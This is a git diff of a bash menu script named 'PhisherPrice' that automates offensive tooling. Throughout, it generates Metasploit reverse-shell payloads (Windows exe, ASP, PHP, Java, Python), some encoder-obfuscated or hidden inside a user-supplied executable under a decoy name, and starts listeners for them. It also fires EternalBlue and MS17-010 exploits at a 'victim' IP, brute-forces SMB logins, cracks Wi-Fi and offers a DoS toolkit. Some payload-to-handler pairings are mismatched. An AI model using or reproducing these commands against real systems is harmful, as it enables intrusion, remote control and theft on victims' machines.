+        msfvenom -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 -f exe > /root/Desktop/pwnd.exe
+echo -e '
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+!Your payload: /root/Desktop/pwnd.exe!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Waiting for listener...
+ 
+'
+
+msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
+        ;;
+      8)
+      clear
+        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 -e x86/shikata_ga_nai -b ‘\x00’ -i 3 -f exe > /root/Desktop/pwnd.exe
+echo -e '
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+!Your payload: /root/Desktop/pwnd.exe!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Waiting for listener...
+ 
+'
+
+msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
+        ;;
+      9)
+      clear
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 -f asp > /root/Desktop/pwnd.asp
+echo -e '
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+!Your payload: /root/Desktop/pwnd.asp!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Waiting for listener...
+ 
+'
+
+msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
+        ;;
+      10)
+      clear
+msfvenom -p python/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/pwnd.py
+echo -e '
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+!Your payload: /root/Desktop/pwnd.py!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Waiting for listener...
+ 
+'
+
+msfconsole -q -x " use exploit/multi/handler; set payload python/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
+        ;;
+      11)
+      clear
+msfvenom -p java/meterpreter/reverse_tcp lhost=$ip lport=4444 -f jar > /root/Desktop/pwnd.jar
+echo -e '
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+!Your payload: /root/Desktop/pwnd.jar!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Waiting for listener...
+ 
+'
+
+msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
+        ;;
+      12)
+      clear
+msfvenom -p osx/x86/shell_bind_tcp RHOST=$ip LPORT=4444 -f macho > bind.macho
+echo -e '
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+!Your payload: /root/Desktop/bind.macho!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Waiting for listener...
+ 
+'
+
+msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
+        ;;
+      13)
+      clear
+msfvenom -p java/meterpreter/reverse_tcp lhost=$ip lport=4444 -f raw > /root/Desktop/pwnd.jsp
+echo -e '
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+!Your payload: /root/Desktop/pwnd.jsp!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Waiting for listener...
+ 
+'
+
+msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
+        ;;
+      14)
+      clear
+msfvenom -p php/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/pwnd.php
+echo -e '
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+!Your payload: /root/Desktop/pwnd.php!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Waiting for listener...
+ 
+'
+
+msfconsole -q -x " use exploit/multi/handler; set payload php/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
+        ;;
+      15)
+      clear
+msfvenom -p osx/x86/shell_bind_tcp RHOST=$ip LPORT=4444 -f macho > bind.macho
+echo -e '
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+!Your payload: /root/Desktop/bind.macho!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Waiting for listener...
+ 
+'
+
+msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
+        ;;
+      16)
+      clear
+echo "your .exe location:"
+read -e exelocation
+msfvenom -x $exelocation -k -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/pornhub.exe
+echo -e '
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+!Your payload: /root/Desktop/pornhub.exe!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Waiting for listener...
+ 
+'
+
+msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
+        ;;
+      17)
+      clear
+echo "your .exe location:"
+read -e bindexelocation
+msfvenom -x $bindexelocation -k -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 -e x86/shikata_ga_nai -i 3 -b “\x00” -f exe > example.exe
+echo -e '
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+!Your payload: /root/Desktop/pornhub.exe!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Waiting for listener...
+ 
+'
+
+msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
+        ;;
+      18)
+      clear
+msfvenom -p osx/x86/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/pwnd.apk
+echo -e '
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+!Your payload: /root/Desktop/pwnd.apk!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Waiting for listener...
+ 
+'
+
+msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
+        ;;
+      b|B)
+        return
+        ;;
+        q|Q)
+        clear
+        echo "Exiting PhisherPrice. Goodbye!"
+        exit 0
+        ;;
+      *)
+        echo "Invalid option: $choice"
+        ;;
+    esac
+    echo ""
+    read -p "Press enter to continue..."
+  done
+}
+# Scanners Submenu function
+scannersmenu() {
+  while true
+  do
 clear
 	echo -e "${banner}"
 	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                      
@@ -2175,76 +2485,50 @@ Auto Scanners
 (6) Attempt To Login Via SMB (smb_login)
 (7) Brute-forces SID Lookups to determine what local users exist the system (SMB_LOOKUPSID)
 (8) determine The Version Of The SMB Service That Is Running (smb_version)
-CTRL + C To Exit
-Press ENTER To Go To Main Menu
+
+Press q/Q To Exit
+Press b/B To Go To Back
 '
-scub1='1'
-scub2='2'
-scub3='3'
-scub4='4'
-scub5='5'
-scub6='6'
-scub7='7'
-scub8='8'
-
 echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Scanners$Blue]:"
-read -e -p" └─────► " x
+read -r -p" └─────► " choice
 
-if [ "$x" == "$scub1" ]; then                    #scub-Option-1
-clear
+    case $choice in
+      1)
+        clear
 echo "Victim's IP:"
 read -e r
 
 msfconsole -q -x " use auxiliary/scanner/smb/smb_ms17_010; set rhosts $r ; exploit ;exit ;"
-echo ' '
-echo '           Press ENTER to Main Menu '
-echo ' '
-read
-
-elif [ "$x" == "$scub2" ]; then                    #scub-Option-2
+        ;;
+      2)
 clear
 echo "Victim's IP:"
 read -e r
 
 msfconsole -q -x " use auxiliary/scanner/smb/pipe_auditor; set rhosts $r ; exploit ;exit ;"
-echo ' '
-echo '           Press ENTER to Main Menu '
-echo ' '
-read
-
-elif [ "$x" == "$scub3" ]; then                    #scub-Option-3
+        ;;
+      3)
 clear
 echo "Victim's IP:"
 read -e r
 
 msfconsole -q -x " use auxiliary/scanner/smb/pipe_dcerpc_auditor; set rhosts $r ; exploit ;exit ;"
-echo ' '
-echo '           Press ENTER to Main Menu '
-echo ' '
-read
-
-elif [ "$x" == "$scub4" ]; then                    #scub-Option-4
+        ;;
+      4)
 clear
 echo "Victim's IP:"
 read -e r
 
 msfconsole -q -x " use auxiliary/scanner/smb/smb2; set rhosts $r ; exploit ;exit ;"
-echo ' '
-echo '           Press ENTER to Main Menu '
-echo ' '
-read
-
-elif [ "$x" == "$scub5" ]; then                    #scub-Option-5
+        ;;
+      5)
 clear
 echo "Victim's IP:"
 read -e r
 
 msfconsole -q -x " use auxiliary/scanner/smb/smb_enumusers; set rhosts $r ; exploit ;exit ;"
-echo ' '
-echo '           Press ENTER to Main Menu '
-echo ' '
-read
-elif [ "$x" == "$scub6" ]; then                    #scub-Option-6
+        ;;
+      6)
 clear
 echo "Victim's IP:"
 read -e r
@@ -2254,235 +2538,41 @@ echo "Victim's User Account:"
 read -e accsmb
 
 msfconsole -q -x " use auxiliary/scanner/smb/smb_login; set rhosts $r ; set SMBPass $passmb ; set SMBUser $accsmb ; exploit ;exit ;"
-echo ' '
-echo '           Press ENTER to Main Menu '
-echo ' '
-read
-elif [ "$x" == "$scub7" ]; then                    #scub-Option-7
+        ;;
+      7)
 clear
 echo "Victim's IP:"
 read -e r
 
 msfconsole -q -x " use auxiliary/scanner/smb/smb_lookupsid; set rhosts $r ; exploit ;exit ;"
-echo ' '
-echo '           Press ENTER to Main Menu '
-echo ' '
-read
-
-elif [ "$x" == "$scub8" ]; then                    #scub-Option-8
+        ;;
+      8)
 clear
 echo "Victim's IP:"
 read -e r
 
 msfconsole -q -x " use auxiliary/scanner/smb/smb_version; set rhosts $r ; exploit ;exit ;"
-echo ' '
-echo '           Press ENTER to Main Menu '
-echo ' '
-read
-
-else 
-
-n
-
-
-fi
-
-
-
-elif [ "$x" == "$auto2" ]; then                    #auto-Option-2
-echo "Victim's IP:"
-read -e r
-
-msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp;  set lhost $ip ; set rhost $r ; exploit ; "
-
-
-
-
-elif [ "$x" == "$auto3" ]; then                    #auto-Option-3
-echo "Victim's IP:"
-read -e r
-
-msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/vncinject/reverse_tcp;  set lhost $ip ; set rhost $r ; set viewonly false ; exploit ; "
-
-elif [ "$x" == "$auto4" ]; then                    #auto-Option-4
-echo "Victim's IP:"
-read -e r
-
-msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec; set payload windows/vncinject/reverse_tcp;  set lhost $ip ; set rhost $r ; set viewonly false ; exploit ; "
-
-elif [ "$x" == "$auto5" ]; then                    #auto-Option-5
-echo "Victim's IP:" 
-read -e r
-
-msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec; set lhost $ip ; set rhost $r ; exploit ;"
-
-
-elif [ "$x" == "$auto6" ]; then                    #auto-Option-6
-echo 'Uripath: (/)'
-read -e u
-msfconsole -q -x " use exploit/windows/misc/hta_server; set srvhost $ip; set uripath /$u; set payload windows/meterpreter/reverse_tcp; set lhost $ip ; exploit ;"
-
-elif [ "$x" == "$auto7" ]; then                    #auto-Option-7
-msfvenom -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 -f exe > /root/Desktop/pwnd.exe
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!Your payload: /root/Desktop/pwnd.exe!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-Waiting for listener...
- 
-'
-
-msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
-
-elif [ "$x" == "$auto8" ]; then                    #auto-Option-8
-
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 -e x86/shikata_ga_nai -b ‘\x00’ -i 3 -f exe > /root/Desktop/pwnd.exe
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!Your payload: /root/Desktop/pwnd.exe!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-Waiting for listener...
- 
-'
-
-msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
-
-elif [ "$x" == "$auto9" ]; then                    #auto-Option-9
-
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 -f asp > /root/Desktop/pwnd.asp
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!Your payload: /root/Desktop/pwnd.asp!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-Waiting for listener...
- 
-'
-
-msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
-
-elif [ "$x" == "$auto10" ]; then                    #auto-Option-10
-
-msfvenom -p python/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/pwnd.py
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!Your payload: /root/Desktop/pwnd.py!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-Waiting for listener...
- 
-'
-
-msfconsole -q -x " use exploit/multi/handler; set payload python/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
-
-elif [ "$x" == "$auto11" ]; then                    #auto-Option-11
-msfvenom -p java/meterpreter/reverse_tcp lhost=$ip lport=4444 -f jar > /root/Desktop/pwnd.jar
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!Your payload: /root/Desktop/pwnd.jar!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-Waiting for listener...
- 
-'
-
-msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
-
-elif [ "$x" == "$auto12" ]; then                    #auto-Option-12
-msfvenom -p osx/x86/shell_bind_tcp RHOST=$ip LPORT=4444 -f macho > bind.macho
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!Your payload: /root/Desktop/bind.macho!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-Waiting for listener...
- 
-'
-
-msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
-
-elif [ "$x" == "$auto13" ]; then                    #auto-Option-13
-msfvenom -p java/meterpreter/reverse_tcp lhost=$ip lport=4444 -f raw > /root/Desktop/pwnd.jsp
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!Your payload: /root/Desktop/pwnd.jsp!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-Waiting for listener...
- 
-'
-
-msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
-
-elif [ "$x" == "$auto14" ]; then                    #auto-Option-14
-msfvenom -p php/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/pwnd.php
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!Your payload: /root/Desktop/pwnd.php!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-Waiting for listener...
- 
-'
-
-msfconsole -q -x " use exploit/multi/handler; set payload php/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
-
-elif [ "$x" == "$auto15" ]; then                    #auto-Option-15
-
-msfvenom -p osx/x86/shell_bind_tcp RHOST=$ip LPORT=4444 -f macho > bind.macho
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!Your payload: /root/Desktop/bind.macho!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-Waiting for listener...
- 
-'
-
-msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
-
-elif [ "$x" == "$auto16" ]; then                    #auto-Option-16
-echo "your .exe location:"
-read -e exelocation
-msfvenom -x $exelocation -k -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/pornhub.exe
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!Your payload: /root/Desktop/pornhub.exe!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-Waiting for listener...
- 
-'
-
-msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
-
-elif [ "$x" == "$auto17" ]; then                    #auto-Option-17
-echo "your .exe location:"
-read -e bindexelocation
-msfvenom -x $bindexelocation -k -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 -e x86/shikata_ga_nai -i 3 -b “\x00” -f exe > example.exe
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!Your payload: /root/Desktop/pornhub.exe!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-Waiting for listener...
- 
-'
-
-msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
-
-elif [ "$x" == "$auto18" ]; then                    #auto-Option-18
-msfvenom -p osx/x86/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/pwnd.apk
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!Your payload: /root/Desktop/pwnd.apk!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-Waiting for listener...
- 
-'
-
-msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
-
-
-else 
-
-n
-
-
-fi
-
-elif [ "$x" == "$option4" ]; then                          #Option4
+        ;;
+      b|B)
+        return
+        ;;
+        q|Q)
+        clear
+        echo "Exiting PhisherPrice. Goodbye!"
+        exit 0
+        ;;
+      *)
+        echo "Invalid option: $choice"
+        ;;
+    esac
+    echo ""
+    read -p "Press enter to continue..."
+  done
+}
+# Submenu 4 function
+submenu4() {
+  while true
+  do
 clear
 	echo -e "${banner}"
 	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                      
@@ -2502,34 +2592,15 @@ Networking
 (10) Start Kismet
 (11) Wi-Fi HoneyPot
 (12) DoS Toolkit
-CTRL + C To Exit
-Press ENTER To Go To Main Menu
-'
-suba='1'
-subb='2'
-subc='3'
-subd='4'
-sube='5'
-yersin='6'
-bully='7'
-blueranger='8'
-eeng='9'
-kissmet1='10'
-whoney='11'
-subdosm='12'
-echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Networking$Blue]:"
-read -e -p" └─────► " x
 
-if [ "$x" == "$suba" ]; then                    #Sub-Option-a
-clear
-echo -e '\e[1;33m
-  _________ __                .__   __  .__         _____                
- /   _____//  |_  ____ _____  |  |_/  |_|  |__     /  _  \_____________  
- \_____  \\   __\/ __ \\__  \ |  |\   __\  |  \   /  /_\  \_  __ \____ \ 
- /        \|  | \  ___/ / __ \|  |_|  | |   Y  \ /    |    \  | \/  |_> >
-/_______  /|__|  \___  >____  /____/__| |___|  / \____|__  /__|  |   __/ 
-        \/           \/     \/               \/          \/      |__|    \e[1;34m
+Press q/Q To Exit
+Press b/B To Go To Back
 '
+echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Networking$Blue]:"
+read -r -p" └─────► " choice
+    case $choice in
+      1)
+      clear
 echo -e "\nNetwork Scanning with arp-scan"
 echo -e "-------------------------------------------\n"
 
@@ -2544,11 +2615,9 @@ if arp-scan -l -s $subopa -v; then
 else
     echo -e "\nNetwork scan failed.\n"
 fi
-
-read -p "Press Enter to continue."
-
-elif [ "$x" == "$subb" ]; then                    #Sub-Option-b
-clear
+        ;;
+      2)
+        clear
 echo -e '\e[1;33m
    _____ ____________________    _________      .__  _____  _____             
   /  _  \\______   \______   \  /   _____/ ____ |__|/ ____\/ ____\___________ 
@@ -2568,10 +2637,271 @@ if netdiscover -p; then
 else
   echo -e "\nInformation gathering failed.\n"
 fi
+        ;;
+      3)
+        cisco
+        ;;
+      4)
+        clear
+echo -e '\e[1;33m
+   _____                  _________                     
+  /     \ _____    ______/   _____/ ____ _____    ____  
+ /  \ /  \\__  \  /  ___/\_____  \_/ ___\\__  \  /    \ 
+/    Y    \/ __ \_\___ \ /        \  \___ / __ \|   |  \
+\____|__  (____  /____  >_______  /\___  >____  /___|  /
+        \/     \/     \/        \/     \/     \/     \/ \e[1;34m
+'  
+echo -e "\nNetwork Port Scanner with Masscan"
+echo -e "---------------------------------\n"
+echo "Enter IP (e.g. 192.168.1.0):"
+read massip
+echo "Enter Port Range (e.g. 24 or 80):"
+read massrange
 
-read -p "Press Enter to continue."
+clear
 
-elif [ "$x" == "$subc" ]; then                    #Sub-Option-c
+echo -e "Starting port scan...\n"
+
+if masscan -p22,21,80,445,443 $massip/$massrange; then
+  echo -e "\nPort scan complete.\n"
+else
+  clear
+  echo -e "\nPort scan failed.\n"
+fi
+        ;;
+      5)
+        clear
+echo -e "\n**************************************************"
+echo "******     Wifite Launcher     ******"
+echo -e "**************************************************\n"
+
+read -p "Are you sure you want to start Wifite? (y/n): " wifiwanger
+
+if [[ $wifiwanger =~ ^[Yy]$ ]]; then
+  clear
+  echo -e "\n**************************************************"
+  echo "******     Starting Wifite     ******"
+  echo -e "**************************************************\n"
+  
+  wifite --kill-all
+else
+  clear
+  echo -e "\n**************************************************"
+  echo "******     Operation cancelled     ******"
+  echo -e "**************************************************\n"
+fi
+        ;;
+      6)
+        clear
+echo -e "\n**************************************************"
+echo "******     Yersinia Launcher     ******"
+echo -e "**************************************************\n"
+
+read -p "Are you sure you want to start Yersinia? (y/n): " siryessir
+
+if [[ $siryessir =~ ^[Yy]$ ]]; then
+  clear
+  echo -e "\n**************************************************"
+  echo "******     Starting Yersinia     ******"
+  echo -e "**************************************************\n"
+
+  yersinia -G
+else
+  clear
+  echo -e "\n**************************************************"
+  echo "******     Operation cancelled     ******"
+  echo -e "**************************************************\n"
+fi
+        ;;
+      7)
+        clear
+echo -e "\n**************************************************"
+echo "******     Wi-Fi Bully     ******"
+echo -e "**************************************************\n"
+
+read -p "Enter the ESSID of the network you want to bully (e.g. 6F36E6): " essid
+if [[ ! $essid =~ ^[a-fA-F0-9]{6}$ ]]; then
+  echo -e "\nInvalid ESSID. Please enter a valid 6-character hexadecimal string."
+  read -p "Press Enter to continue."
+fi
+
+read -p "Which Wi-Fi interface are you using? (wlan0mon/wlan1mon): " interface
+if [[ ! $interface =~ ^(wlan0mon|wlan1mon)$ ]]; then
+  echo -e "\nInvalid interface name. Please enter either wlan0mon or wlan1mon."
+  read -p "Press Enter to continue."
+fi
+
+read -p "Are you sure you want to bully network with ESSID $essid using interface $interface? (y/n): " confirm
+if [[ ! $confirm =~ ^[Yy]$ ]]; then
+  echo -e "\nOperation cancelled."
+  read -p "Press Enter to continue."
+fi
+
+clear
+echo -e "\n**************************************************"
+echo "******     Starting Bully     ******"
+echo -e "**************************************************\n"
+bully -e $essid $interface
+
+if [[ $? -ne 0 ]]; then
+  clear
+  echo -e "\nBully failed. Please make sure you have the necessary tools installed and try again."
+  read -p "Press Enter to continue."
+fi
+
+echo -e "\n**************************************************"
+echo "******     Bullying complete     ******"
+echo -e "**************************************************\n"
+
+        ;;
+      8)
+        clear
+echo -e "\n**************************************************"
+echo "******     Fern Wifi-Cracker Launcher     ******"
+echo -e "**************************************************\n"
+
+read -p "Are you sure you want to start Fern Wifi-Cracker? (y/n): " start_fern
+
+if [[ $start_fern =~ ^[Yy]$ ]]; then
+  clear
+  echo -e "\n**************************************************"
+  echo "******     Starting Fern Wifi-Cracker     ******"
+  echo -e "**************************************************\n"
+
+  fern-wifi-cracker
+else
+  clear
+  echo -e "\n**************************************************"
+  echo "******     Operation cancelled     ******"
+  echo -e "**************************************************\n"
+fi
+        ;;
+      9)
+        clear
+echo -e "\n**************************************************"
+echo "******     Easside-NG Launcher     ******"
+echo -e "**************************************************\n"
+
+read -p "Are you sure you want to start Easside-NG? (y/n): " easside_choice
+
+if [[ $easside_choice =~ ^[Yy]$ ]]; then
+  echo "Enter victim's BSSID (e.g. de:ad:be:ef:ca:fe): "
+  read vbssid
+  
+  echo "Enter source MAC address: "
+  read srcmac
+  
+  echo "Enter Buddy-ng IP address (mandatory), usually 127.0.0.1: "
+  read srcip
+  
+  echo "Enter your interface (e.g. wlan0mon or wlan1mon): "
+  read easymc
+  
+  echo "Enter the channel ID (e.g. 6): "
+  read easychan
+  
+  clear
+  
+  echo -e "\n**************************************************"
+  echo "******     Starting Fern Easside-NG     ******"
+  echo -e "**************************************************\n"
+  
+  xterm -e "buddy-ng" &
+  sleep 1
+  
+  easside-ng -v $vbssid -m $srcmac -s $srcip -f $easymc -c $easychan
+  
+else
+  
+  echo -e "\n**************************************************"
+  echo "******     Operation cancelled     ******"
+  echo -e "**************************************************\n"
+fi
+        ;;
+      10)
+        clear
+echo -e "\n**************************************************"
+echo "******        Kismet Launcher        ******"
+echo -e "**************************************************\n"
+
+read -p "Are you sure you want to start Kismet? (y/n): " kissmebaby
+
+if [[ $kissmebaby =~ ^[Yy]$ ]]; then
+  clear
+  echo -e "\n**************************************************"
+  echo "******        Starting Kismet        ******"
+  echo "******  To Stop Kismet CTRL + C     ******"
+  echo -e "**************************************************\n"
+  
+  kismet
+else
+  clear
+  echo -e "\n**************************************************"
+  echo "******     Operation cancelled     ******"
+  echo -e "**************************************************\n"
+fi
+        ;;
+      11)
+        clear
+echo "Are you sure you want to start HoneyPot?"
+read hpot
+
+if [[ $hpot =~ ^[Yy]$ ]]; then
+  echo "Enter a wifi name of your choice: " 
+  read wifiname
+  echo "Enter wifi channel you wish to broadcast on (e.g. 6 or 11): " 
+  read wifichannel
+  echo "Enter your Interface (e.g. wlan0 or wlan1): " 
+  read hpotif
+
+  clear
+  echo -e "\n**************************************************"
+  echo "******        Starting HoneyPot...      ******"
+  echo -e "**************************************************\n"
+
+  airmon-ng check kill
+  wifi-honey $wifiname $wifichannel $hpotif
+
+  read -p "Press Enter to disable monitor mode and continue." confirm
+
+  if [[ $confirm =~ ^[Yy]$ ]]; then
+    sudo service network-manager restart
+  else
+    echo -e "\n**************************************************"
+    echo "******  Monitor mode has not been disabled. ******"
+    echo -e "**************************************************\n"
+  fi
+
+  read -p "Press Enter to continue."
+else
+  clear
+  echo -e "\n**************************************************"
+  echo "******        Operation cancelled        ******"
+  echo -e "**************************************************\n"
+fi
+        ;;
+      12)
+        dostoolkit
+        ;;
+      b|B)
+        return
+        ;;
+        q|Q)
+        clear
+        echo "Exiting PhisherPrice. Goodbye!"
+        exit 0
+        ;;
+      *)
+        echo "Invalid option: $choice"
+        ;;
+    esac
+    echo ""
+    read -p "Press enter to continue..."
+  done
+}
+cisco() {
+  while true
+  do
 clear
 	echo -e "${banner}"
 	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                      
@@ -2581,19 +2911,15 @@ Cisco Wifi Routers
 \e[3;39m
 (1) Cisco GE xPloit
 (2) Cisco Audit Tool
-CTRL + C To Exit
-Press ENTER To Go To Main Menu
+
+Press q/Q To Exit
+Press b/B To Go To Back
 '
-cisco1='1'
-cisco2='2'
-
-
-wait
 echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Networking$Blue]:"
-echo -e $Blue" └─────► " ;read -p " CHOOSE: " x
-
-if [ "$x" == "$cisco1" ]; then                    #cisco-Option-1
-clear
+read -r -p" └─────► " choice
+    case $choice in
+      1)
+        clear
 echo -e '\e[1;33m
 _________   ________  ___________              .__         .__  __   
 \_   ___ \ /  _____/  \_   _____/__  _________ |  |   ____ |__|/  |_ 
@@ -2659,11 +2985,9 @@ echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 '
 cge.pl "$target_ip" "$vulnerability" "$ios_option" "$password_option" "$user_option"
-
-read
-
-elif [ "$x" == "$cisco2" ]; then                    #cisco-Option-2
-clear
+        ;;
+      2)
+        clear
 check_ios_history() {
     if [ "$ioscheck" == "-i" ]; then
         echo "Checking for IOS history bug..."
@@ -2735,272 +3059,26 @@ CAT -h "$target_ip" -p "$port_number" "$password_list" "$ioscheck" "$userlist"
 
 guess_usernames
 check_ios_history
-
-read
-
-else 
-
-n
-
-
-fi
-
-elif [ "$x" == "$subd" ]; then                    #Sub-Option-d
-clear
-echo -e '\e[1;33m
-   _____                  _________                     
-  /     \ _____    ______/   _____/ ____ _____    ____  
